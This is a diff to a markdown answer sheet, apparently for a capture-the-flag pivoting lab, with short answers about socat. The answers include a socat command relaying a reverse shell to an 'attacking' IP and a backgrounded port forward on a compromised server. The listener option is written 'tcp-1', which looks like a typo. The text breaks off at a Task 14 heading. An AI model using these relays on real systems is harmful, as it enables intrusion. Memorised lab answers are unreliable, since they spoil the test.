@@ -217,3 +217,20 @@ ssh -L 8000:172.16.0.50:80 user@127.0.0.1 -fN
 
 puttygen
 
+## Task 13 - Pivoting Socat
+
+**Which socat option allows you to reuse the same listening port for more than one connection?**
+
+reuseaddr
+
+**If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?**
+
+./socat tcp-1:8000 tcp:172.16.0.200:443
+
+**What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?**
+
+./socat tcp-1:2222,fork,reuseaddr tcp:172.16.0.100:22 &
+
+## Task 14 - Pivoting Chisel
+
+**
